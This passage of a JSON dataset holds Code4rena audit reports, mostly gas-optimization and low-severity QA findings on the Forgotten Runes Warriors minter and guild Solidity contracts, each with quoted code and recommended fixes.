[`CToken.sol#L377-L381`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CToken.sol#L377-L381).\n#### Recommendation\nAdd `@return`'s.\n\n### 2. Declare `uint` as `uint256`.\n#### Recommendation\nTo favor explicitness, all instances of `uint` should be declared as `uint256`.\n\n#### Tools used\nc4udit, manual, slither.",
    "dataSource": {
      "name": "code-423n4/2022-05-bunker-findings",
      "repo": "https://github.com/code-423n4/2022-05-bunker-findings",
      "url": "https://github.com/code-423n4/2022-05-bunker-findings/issues/90"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas optimization report\n\n## Unnecessary checks in function [currentDaPrice](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L275)\n\nChecks found at the end of the function `currentDaPrice` are unnecessary. As long as all values are set correctly (that is `daPriceCurveLength` is not smaller than `daDropInterval`), this function will always return `startPrice - stepDeduction`.\n\nCode:\n```\n292: if (stepDeduction > startPrice) {\n293:     return lowestPrice;\n294: }\n295: uint256 currentPrice = startPrice - stepDeduction;\n296: return currentPrice > lowestPrice ? currentPrice : lowestPrice;\n```\n\n## Caching variables on stack \n\nConsider caching some variables and reading them from stack in order to optimize gas usage. The following variables should be cached:\n\n**1. Variables `numSold` and `maxDaSupply` in function [bidSummon](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L130)** \n\nCode:\n```sol\n136: require(numSold < maxDaSupply, 'Auction sold out');\n137: require(numSold + numWarriors <= maxDaSupply, 'Not enough remaining');\n\n154: numSold += numWarriors;\n\n156: if (numSold == maxDaSupply) {\n```\n\nProposed changes:\n```sol\nuint256 _numSold = numSold;\nuint256 _maxDaSupply = maxDaSupply;\n\n136: require(_numSold < _maxDaSupply, 'Auction sold out');\n137: require(_numSold + numWarriors <= _maxDaSupply, 'Not enough remaining');\n\n_numSold += numWarriors;\n\n154: numSold = _numSold;\n\n156: if (_numSold == _maxDaSupply) {\n``` \n**2. Variable `numSold`  in function [mintlistSummon](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L171)**\n\nCode:\n```sol\n177: require(numSold < maxForSale, 'Sold out');\n\n193: numSold += 1;\n```\n\nProposed changes:\n```sol\nuint256 _numSold = numSold;\n\n177: require(_numSold < maxForSale, 'Sold out');\n\n193: numSold = _numSold + 1;\n```\n\n**3. Variables `numSold` and `maxForSale` in function [publicSummon](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L207)**\n\nCode:\n```sol\n207: require(numSold < maxForSale, 'Sold out');\n208: require(numSold + numWarriors <= maxForSale, 'Not enough remaining');\n\n219: numSold += numWarriors;\n```\n\nProposed changes:\n```sol\nuint256 _numSold = numSold;\nuint256 _maxForSale = maxForSale;\n\n207: require(_numSold < _maxForSale, 'Sold out');\n208: require(_numSold + numWarriors <= _maxForSale, 'Not enough remaining');\n\n219: numSold = _numSold + numWarriors;\n```\n**4. Variable `numClaimed` in function [claimSummon](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L229)**\n\nCode:\n```sol\n234: require(numClaimed < maxForClaim, 'No more claims');\n\n248: numClaimed += 1;\n```\n\nProposed changes:\n```sol\nuint256 _numClaimed = numClaimed;\n234: require(_numClaimed < maxForClaim, 'No more claims');\n\n248: numClaimed = _numClaimed + 1;\n```\n\n**5. Variables `daStartTime`, `startPrice`, `daPriceCurveLength` and `daDropInterval` in function [currentDaPrice](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L275)**\n\nCode: \n```\n279: if (block.timestamp >= daStartTime + daPriceCurveLength) {\n280:     // end of the curve\n281:     return lowestPrice;\n282: }\n283:\n284: uint256 dropPerStep = (startPrice - lowestPrice) /\n285:     (daPriceCurveLength / daDropInterval);\n286:\n287: uint256 elapsed = block.timestamp - daStartTime;\n288: uint256 steps = elapsed / daDropInterval;\n289: uint256 stepDeduction = steps * dropPerStep;\n\n// This line has been changed to address the first issue\nreturn startPrice - stepDeduction;\n```\n\nProposed changes:\n```\nuint256 _daStartTime = daStartTime;\nuint256 _daPriceCurveLength = daPriceCurveLength;\n\n279: if (block.timestamp >= _daStartTime + _daPriceCurveLength) {\n280:     // end of the curve\n281:     return lowestPrice;\n282: }\n\nuint256 _startPrice = startPrice;\nuint256 _daDropInterval = daDropInterval;\n\n284: uint256 dropPerStep = (_startPrice - lowestPrice) /\n285:     (_daPriceCurveLength / _daDropInterval);\n\n287: uint256 elapsed = block.timestamp - _daStartTime;\n288: uint256 steps = elapsed / _daDropInterval;\n289: uint256 stepDeduction = steps * dropPerStep;\n\n// This line has been changed to address the first issue\nreturn _startPrice - stepDeduction;\n```\n\n## Don't initialize variables with default values\n\n\n**1. In function [bidSummon](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L130):**\n\nCode:\n```sol\n162: for (uint256 i = 0; i < numWarriors; i++) {\n```\n\n**2. In function [publicSummon](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L201)**\n\nCode:\n```sol\n220: for (uint256 i = 0; i < numWarriors; i++) {\n```\n\n**3. In function [teamSummon](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L257)**\n\nCode:\n```sol\n259: for (uint256 i = 0; i < count; i++) {\n```\n\n\n## Long revert strings\n\nConsider making revert strings not longer than 32 characters in order to save gas. The following revert strings are longer than 32 characters:\n\nIn file `ForgottenRunesWarriorsMinter.sol`:\n```\n142: 'You can summon no more than 20 Warriors at a time' (49 characters)\n148: 'Ether value sent is not sufficient' (34 characters)\n212: 'You can summon no more than 20 Warriors at a time' (49 characters)\n```\n\n## Use `!= 0` instead of `> 0`\n\nConsider changing comparisons whether a value is greater than 0 to comparisons whether a value is not equal to 0 in order to save gas.\n\nIn file `ForgottenRunesWarriorsMinter.sol`:\n```\n141: numWarriors > 0 && numWarriors <= 20\n```\n\n## Unnecessary check in function `forwardERC20s`\n\nIn function [forwardERC20s](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173) there is a check whether `msg.sender` is the null address. However this can never be the case, so this check should be removed.\n\nCode:\n```sol\n174: require(address(msg.sender) != address(0));\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/277"
    }
  },
  {
    "title": "QA Report",
    "body": "\n### QA by perito flores\n\n##  [L01] No event emission\n\n\n\nI see that there you are not emitting any event in your contract.   Events are the way to communicate with a client application or a front-end website to know what is happening in the blockchain.  \n\nThe following function are lacking events.\n\n\n\nAt `ForgottenRunesWarriorsGuild.sol`\n\n    initialize, burn, setBaseURI, setMinter, setMinter, withdrawAll, forwardERC20s\n\nAt `ForgottenRunesWarriorsMinter.sol`\n\n    bidSummon, mintlistSummon, publicSummon, claimSummon, teamSummon, issueRefunds, selfRefund, setDaStartTime, setMintlistStartTime, setPublicStartTime, setClaimsStartTime, setSelfRefundsStartTime, etc\n",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/276"
    }
  },
  {
    "title": "QA Report",
    "body": "Thanks for the detailed explanations of your design decisions and reasoning and the walkthrough video you created for this contest!\n\n## Low\n\n### Gas stipend for `payable.send` may be too low for contract wallets\n\nETH withdrawals in both the minter and token contracts use `payable(address).send` to transfer ether to the vault address. If the configured vault is a smart contract wallet like a Gnosis Safe multisig, the gas stipend from `.send` may be too low to complete the transfer and these methods may revert with an out of gas error. There are [workarounds](https://help.gnosis-safe.io/en/articles/5249851-why-can-t-i-transfer-eth-from-a-contract-into-a-safe) to this issue, but it could be an unexpected interruption.\n\nIf your vault address is already known, consider simulating transfers out of these contracts using a fork test or transaction simulator to ensure they will succeed.\n\nAlternatively, consider reusing the existing `_safeTransferETH` function. Using `.call` can introduce reentrancy, but these are permissioned calls to a trusted address that change no state variables.\n\n\n[`ForgottenRunesWarriorsMinter.sol#L604-L619`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L604-L619)\n\n```solidity\n    /**\n     * @notice Withdraw funds to the vault\n     * @param _amount uint256 the amount to withdraw\n     */\n    function withdraw(uint256 _amount) public onlyOwner {\n        require(address(vault) != address(0), 'no vault');\n        require(payable(vault).send(_amount));\n    }\n\n    /**\n     * @notice Withdraw all funds to the vault\n     */\n    function withdrawAll() public payable onlyOwner {\n        require(address(vault) != address(0), 'no vault');\n        require(payable(vault).send(address(this).balance));\n    }\n```\n[`ForgottenRunesWarriorsGuild.sol#L159-L165`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L159-L165)\n\n```solidity\n    /**\n     * @dev ETH should not be sent to this contract, but in the case that it is\n     * sent by accident, this function allows the owner to withdraw it.\n     */\n    function withdrawAll() public payable onlyOwner {\n        require(payable(msg.sender).send(address(this).balance));\n    }\n```\n\n### Missing validations for `setLowestPrice`\n\nThe contract owner can set `lowestPrice` to a value greater than `startPrice`. This will cause price calculations to revert with a checked arithmetic error.\n\nThis would interrupt bidding, but does not prevent the owner from setting parameters back to valid values.\n\nThe owner can also set `lowestPrice` to zero, which would allow users to mint for free if the auction price decreases low enough.\n\nConsider validating these parameters.\n\n[`ForgottenRunesWarriorsMinter.sol#L554-L559`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L554-L559)\n\n```solidity\n    /**\n     * @notice set the dutch auction lowest price\n     */\n    function setLowestPrice(uint256 _newPrice) public onlyOwner {\n        require(_newPrice > 0 && _newPrice < startPrice, \"Invalid lowest price\");\n        lowestPrice = _newPrice;\n    }\n```\n\n### Missing validations for `setDaDropInterval`\n\nThe contract owner can set `daDropInterval` to a value greater than `daPriceCurveLength`, causing step calculations to round down to zero. This will cause auction price calculations to revert with a division by zero error.\n\nThis would interrupt bidding, but does not prevent the owner from setting parameters back to valid values.\n\nConsider validating these parameters.\n\n[`ForgottenRunesWarriorsMinter.sol#L568-L574`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L568-L574)\n\n```solidity\n    /**\n     * @notice set how long it takes for the dutch auction to step down in price\n     */\n    function setDaDropInterval(uint256 _newTime) public onlyOwner {\n        require(daDropInterval > 0 && daDropInterval < daPriceCurveLength, \"Invalid drop interval\");\n        daDropInterval = _newTime;\n    }\n\n```\n\n## QA/Noncritical\n\n### Prefer `safeTransfer` for `IERC20`\n\nThe `forwardERC20s` function calls `IERC20.transfer` without checking the return value. The transfer may fail silently without reverting. Consider using OpenZeppelin [SafeERC20](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20) and `safeTransfer`.\n\n[`ForgottenRunesWarriorsMinter.sol#forwardERC20s`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L621-L630)\n\n```solidity\n    /**\n     * @dev ERC20s should not be sent to this contract, but if someone\n     * does, it's nice to be able to recover them\n     * @param token IERC20 the token address\n     * @param amount uint256 the amount to send\n     */\n    function forwardERC20s(IERC20 token, uint256 amount) public onlyOwner {\n        require(address(msg.sender) != address(0));\n        token.transfer(msg.sender, amount);\n    }\n```\n\n### Missing events for permissioned parameter changes\n\nConsider adding and emitting events when the contract owner changes sensitive parameters, like the merkle roots, phase times, prices and vault address in `ForgottenRunesWarriorsMinter.sol` and the base URI, minter address, and provenance hash in `ForgottenRunesWarriorsGuild.sol`. This enables you to monitor off chain for suspicious activity, and allows end users to observe and trust changes to these parameters.\n\n### Avoid long numeric literals\n\nIt's possible to use `type(uint256).max` rather than a numeric literal to access the maximum value of `uint256`. This is more concise, and is a safeguard against accidentally deleting a stray `f`:\n\n[`ForgottenRunesWarriorsMinter.sol#L16-L18`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L16-L18)\n\n```solidity\n    /// @notice The start timestamp for the Dutch Auction (DA) sale and price\n    uint256 public daStartTime =\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n```\n\nSuggested:\n\n```solidity\n    /// @notice The start timestamp for the Dutch Auction (DA) sale and price\n    uint256 public daStartTime = type(uint256).max;\n```\n\n### Incorrect address validation\n\nThe `forwardERC20s` function in both contracts checks that `msg.sender` is not the zero address. The intent here is not clear, but this is very unlikely to be the case. Perhaps this was meant to zero check `address(token)` instead:\n\n[`ForgottenRunesWarriorsMinter.sol#forwardERC20s`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L621-L630)\n\n```solidity\n    /**\n     * @dev ERC20s should not be sent to this contract, but if someone\n     * does, it's nice to be able to recover them\n     * @param token IERC20 the token address\n     * @param amount uint256 the amount to send\n     */\n    function forwardERC20s(IERC20 token, uint256 amount) public onlyOwner {\n        require(address(msg.sender) != address(0));\n        token.transfer(msg.sender, amount);\n    }\n```\n\n### Unlocked version pragmas\n[`ForgottenRunesWarriorsMinter.sol`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L1) and [`ForgottenRunesWarriorsGuild.sol`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L1) have floating version pragmas. To prevent compiling with an unexpected Solidity version, set these explicitly.\n\n### Missing license identifiers\n\n[`ForgottenRunesWarriorsMinter.sol`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L1) and [`ForgottenRunesWarriorsGuild.sol`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L1) are missing [license identifiers](https://docs.soliditylang.org/en/v0.8.6/layout-of-source-files.html#spdx-license-identifier).\n",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/270"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n### 1. Unsafe ERC20 Operations\n#### Impact\nThe return value of an external transfer/transferFrom call is not checked.\n#### Proof of Concept\n```shell\n  /ForgottenRunesWarriorsGuild.sol::175 => token.transfer(msg.sender, amount);\n  /ForgottenRunesWarriorsMinter.sol::402 => IERC20(weth).transfer(to, amount);\n  /ForgottenRunesWarriorsMinter.sol::629 => token.transfer(msg.sender, amount);\n```\n#### Recommendation\nUse `SafeERC20`, or ensure that the transfer/transferFrom return value is checked.\n\n## Non-Critical\n### 1. Natspec is incomplete.\n#### Proof of Concept\n[`ForgottenRunesWarriorsMinter.sol`](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol)\n```solidity=272\n    /**\n     * @notice returns the current dutch auction price\n     */\n    function currentDaPrice() public view returns (uint256) {\n```\n```solidity=299\n    /**\n     * @notice returns whether the dutch auction has started\n     */\n    function daStarted() public view returns (bool) {\n```\n```solidity=306\n    /**\n     * @notice returns whether the mintlist has started\n     */\n    function mintlistStarted() public view returns (bool) {\n```\n```solidity=313\n    /**\n     * @notice returns whether the public mint has started\n     */\n    function publicStarted() public view returns (bool) {\n```\n```solidity=320\n    /**\n     * @notice returns whether the claims phase has started\n     */\n    function claimsStarted() public view returns (bool) {\n```\n```solidity=327\n    /**\n     * @notice returns whether self refunds phase has started\n     */\n    function selfRefundsStarted() public view returns (bool) {\n```\n```solidity=334\n    /**\n     * @notice returns the number of minter addresses in the DA phase (includes duplicates)\n     */\n    function numDaMinters() public view returns (uint256) {\n```\n#### Recommendation\nAdd natspec `@return` comments.\n\n#### Tools used\nManual, Slither.",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/263"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Gas\n### 1. Contracts in scope are using unlocked pragma.\n#### Impact\nAll the contracts in scope use `pragma solidity ^0.8.0`, allowing wide enough range of versions.\n#### Proof of Concept\n```shell\n ^0.8.0 (contracts/ForgottenRunesWarriorsGuild.sol#1)\n ^0.8.0 (contracts/ForgottenRunesWarriorsMinter.sol#1)\n```\n#### Recommendation\nConsider locking compiler version, for example `pragma solidity 0.8.6`.\nThis can have additional benefits, for example using custom errors to save gas and so forth.\n\n### 2. Use != 0 instead of > 0 for Unsigned Integer Comparison.\n#### Impact\n`!= 0` is cheapear than `> 0` when comparing unsigned integers in require statements.\n#### Proof of Concept\n```shell=\n  /ForgottenRunesWarriorsMinter.sol::141 => numWarriors > 0 && numWarriors <= 20,\n  /ForgottenRunesWarriorsMinter.sol::211 => numWarriors > 0 && numWarriors <= 20,\n  /ForgottenRunesWarriorsMinter.sol::378 => if (owed > 0) {\n ```\n#### Recommendation\nUse `!= 0` instead of `> 0`. \n\n### 3. No need to initialize variables with default values.\n#### Impact\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n#### Proof of Concept\n```shell\n  /ForgottenWarriorsGuild.sol::24 => uint256 public numMinted = 0; \n  /ForgottenRunesWarriorsMinter.sol::162 => for (uint256 i = 0; i < numWarriors; i++) {\n  /ForgottenRunesWarriorsMinter.sol::220 => for (uint256 i = 0; i < numWarriors; i++) {\n  /ForgottenRunesWarriorsMinter.sol::259 => for (uint256 i = 0; i < count; i++) {\n```\n#### Recommendation\nRemove explicit zero initialization.\n\n### 4. public` Functions can be `external`.\n#### Impact\n`public` functions that are never called by the contract should be declared `external` to save gas.\n#### Proof of Concept\n```shell\ninitialize(address) should be declared external:\n        - ForgottenRunesWarriorsGuild.initialize(address) (contracts/ForgottenRunesWarriorsGuild.sol#52-54)\nexists(uint256) should be declared external:\n        - ForgottenRunesWarriorsGuild.exists(uint256) (contracts/ForgottenRunesWarriorsGuild.sol#85-87)\nmint(address) should be declared external:\n        - ForgottenRunesWarriorsGuild.mint(address) (contracts/ForgottenRunesWarriorsGuild.sol#94-106)\nburn(uint256) should be declared external:\n        - ForgottenRunesWarriorsGuild.burn(uint256) (contracts/ForgottenRunesWarriorsGuild.sol#113-119)\nsetProvenanceHash(string) should be declared external:\n        - ForgottenRunesWarriorsGuild.setProvenanceHash(string) (contracts/ForgottenRunesWarriorsGuild.sol#145-147)\nwithdrawAll() should be declared external:\n        - ForgottenRunesWarriorsGuild.withdrawAll() (contracts/ForgottenRunesWarriorsGuild.sol#163-165)\nforwardERC20s(IERC20,uint256) should be declared external:\n        - ForgottenRunesWarriorsGuild.forwardERC20s(IERC20,uint256) (contracts/ForgottenRunesWarriorsGuild.sol#173-176)\nnumDaMinters() should be declared external:\n        - ForgottenRunesWarriorsMinter.numDaMinters() (contracts/ForgottenRunesWarriorsMinter.sol#337-339)\nissueRefunds(uint256,uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.issueRefunds(uint256,uint256) (contracts/ForgottenRunesWarriorsMinter.sol#350-358)\nrefundAddress(address) should be declared external:\n        - ForgottenRunesWarriorsMinter.refundAddress(address) (contracts/ForgottenRunesWarriorsMinter.sol#364-366)\nselfRefund() should be declared external:\n        - ForgottenRunesWarriorsMinter.selfRefund() (contracts/ForgottenRunesWarriorsMinter.sol#371-374)\npause() should be declared external:\n        - ForgottenRunesWarriorsMinter.pause() (contracts/ForgottenRunesWarriorsMinter.sol#427-429)\nunpause() should be declared external:\n        - ForgottenRunesWarriorsMinter.unpause() (contracts/ForgottenRunesWarriorsMinter.sol#434-436)\nsetSelfRefundsStartTime(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setSelfRefundsStartTime(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#469-471)\nsetPhaseTimes(uint256,uint256,uint256,uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setPhaseTimes(uint256,uint256,uint256,uint256) (contracts/ForgottenRunesWarriorsMinter.sol#480-500)\nsetMintlist1MerkleRoot(bytes32) should be declared external:\n        - ForgottenRunesWarriorsMinter.setMintlist1MerkleRoot(bytes32) (contracts/ForgottenRunesWarriorsMinter.sol#505-507)\nsetMintlist2MerkleRoot(bytes32) should be declared external:\n        - ForgottenRunesWarriorsMinter.setMintlist2MerkleRoot(bytes32) (contracts/ForgottenRunesWarriorsMinter.sol#513-515)\nsetClaimlistMerkleRoot(bytes32) should be declared external:\n        - ForgottenRunesWarriorsMinter.setClaimlistMerkleRoot(bytes32) (contracts/ForgottenRunesWarriorsMinter.sol#520-522)\nsetStartPrice(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setStartPrice(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#550-552)\nsetLowestPrice(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setLowestPrice(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#557-559)\nsetDaPriceCurveLength(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setDaPriceCurveLength(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#564-566)\nsetDaDropInterval(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setDaDropInterval(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#571-573)\nsetFinalPrice(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setFinalPrice(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#579-581)\nsetMaxDaSupply(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setMaxDaSupply(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#586-588)\nsetMaxForSale(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setMaxForSale(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#593-595)\nsetMaxForClaim(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.setMaxForClaim(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#600-602)\nwithdraw(uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.withdraw(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#608-611)\nwithdrawAll() should be declared external:\n        - ForgottenRunesWarriorsMinter.withdrawAll() (contracts/ForgottenRunesWarriorsMinter.sol#616-619)\nforwardERC20s(IERC20,uint256) should be declared external:\n        - ForgottenRunesWarriorsMinter.forwardERC20s(IERC20,uint256) (contracts/ForgottenRunesWarriorsMinter.sol#627-630)\n```\n##### Recommendation\nUse the `external` attribute for functions never called from the contract.\n\n### 5. `++i` costs less gas compared to `i++` or `i += 1`\n#### Impact\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n#### Proof of Concept\n```shell\n  /ForgottenRunesWarriorsMinter.sol::162 => for (uint256 i = 0; i < numWarriors; i++) {\n  /ForgottenRunesWarriorsMinter.sol::220 => for (uint256 i = 0; i < numWarriors; i++) {\n  /ForgottenRunesWarriorsMinter.sol::259 => for (uint256 i = 0; i < count; i++) {\n  /ForgottenRunesWarriorsMinter.sol::355 => for (uint256 i = startIdx; i < endIdx + 1; i++) {\n```\n#### Recommendation\nUse `++i` instead of `i++` to increment the value of an uint variable.\nSame thing for `--i` and `i--`.\n\n### 6. Use Custom Errors instead of Revert Strings.\n#### Impact\n[Custom errors from Solidity 0.8.4](https://blog.soliditylang.org/2021/04/21/custom-errors/) are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n#### Recommendation\nUse custom errors instead of revert strings.\n\n#### Tools used\nc4udit, manual, slither.",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/262"
    }
  },
  {
    "title": "QA Report",
    "body": "### 1. Initialization can be rerun to reset the minter in Guild contract (low)\n\nAs the Guild-Minter link is essential to collection's economics any material change after the initial setup can break the system, and that is possible now.\n\nAs a simplest example, setting new minter after the action start when some NFTs were minted will reduce maximum issuance cap for the new minter.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L48-L54\n\n```solidity\n    /**\n     * @dev Convenient way to initialize the contract\n     * @param newMinter address of the minter contract\n     */\n    function initialize(address newMinter) public onlyOwner {\n        setMinter(newMinter);\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider making setMinter() a one time action, requiring current minter to be zero.\n\n\n### 2. Minter's configuration variables can be reset after DA and subsequent phases start (low)\n\nBesides final price and vault address all other configuration variables shouldn't be available for any change after auction phase has started as it will break the system mechanics in the various ways.\n\nFor example, setting `warriors` to any other NFT contract after first mint will split the collection and increase the maximum available number of warriors (i.e. hard cap will be breached).\n\n## Proof of Concept\n\nNow all configuration variables can be changed by owner at any time:\n\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L438-L602\n\nFor example, is NFT address be reset at any point after auction start, which can break the mechanics of the system:\n\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L531-L538\n\n```solidity\n    /**\n     * @notice set the warriors token address\n     */\n    function setWarriorsAddress(\n        IForgottenRunesWarriorsGuild _newWarriorsAddress\n    ) public onlyOwner {\n        warriors = _newWarriorsAddress;\n    }\n```\n\n## Recommended Mitigation Steps\n\nIt looks like that all the config variables besides final price and vault address are not subject to change after DA start, so consider requiring `block.timestamp <= daStartTime` in the corresponding setters.\n\n\n### 3. Unsafe transfer is used in rescue (low)\n\nTransfer without result check is used for an arbitrary ERC20 in onlyOwner rescue function.\n\nThe function can be rerun, but the lack of execution control makes its use ambiguous.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L175-L175\n\n```solidity\n        token.transfer(msg.sender, amount);\n```\n\n## Recommended Mitigation Steps\n\nRequire transfer success or consider safeTransfer as not all the tokens revert on failure.\n\n\n### 4. Floating pragma of two types is used across the system (non-critical)\n\n## Impact\n\nAs different compiler versions have critical behavior specifics if the contracts get accidentally deployed using another compiler version compared to the one they were tested with, various types of undesired behavior can be introduced.\n\n## Proof of Concept\n\nInterfaces use `pragma solidity ^0.8.6`:\n\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/interfaces/IForgottenRunesWarriorsGuild.sol#L5-L5\n\nBoth contracts use `pragma solidity ^0.8.0`:\n\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L1-L1\n\n## Recommended Mitigation Steps\n\nConsider fixing the version to `0.8.x` across all the codebase.\n\n\n### 5. Max int representation is error-prone (non-critical)\n\n`0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff` is used as max int representation in ForgottenRunesWarriorsMinter.\n\nThere are better ways that reduce operational error probability and improve readability.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L16-L35\n\n```solidity\n    /// @notice The start timestamp for the Dutch Auction (DA) sale and price\n    uint256 public daStartTime =\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n\n    /// @notice The start timestamp for mintlisters\n    /// @dev This is the end of DA phase. No more DA bids when this is hit\n    uint256 public mintlistStartTime =\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n\n    /// @notice The start timestamp for the public sale\n    uint256 public publicStartTime =\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n\n    /// @notice The start timestamp for the claims\n    uint256 public claimsStartTime =\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n\n    /// @notice The start timestamp for self refunds\n    uint256 public selfRefundsStartTime =\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n```\n\n## Recommended Mitigation Steps\n\nFor compilers after 0.6.8 it's a kind of optimal to use 